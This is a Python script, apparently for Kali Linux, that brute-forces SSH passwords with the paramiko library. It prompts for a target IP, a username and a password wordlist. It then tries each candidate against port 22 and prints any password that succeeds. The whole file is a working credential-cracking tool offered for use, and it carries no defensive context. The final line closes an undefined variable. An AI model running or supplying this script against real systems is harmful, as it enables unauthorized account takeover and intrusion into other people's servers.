# SYNTAX KALI = python3 SSHbrute.py
# Imprt the relevant python repositories
import paramiko
import sys
import os

target = str(input('Please enter target IP address: ')) # Target IP address where the login page is located
username = str(input('Please enter username to bruteforce: ')) # What user account would we like to crack the password to?
password_file = str(input('Please enter location of the password file: ')) # The file that contains the wordlist that holds potnetial passwords

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password) #try TCP port 22, attempt to login using username=str and interrogate the password_file
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password) # Display in terminal password found
                 exit(0)
            elif response == 1:  
                print('password bruteforce unsuccessful') # If no passwords in the wordlist are correct, print 'password bruteforce unsuccessful'
        except Exception as e:
            print(e)
        pass

input_file.close()
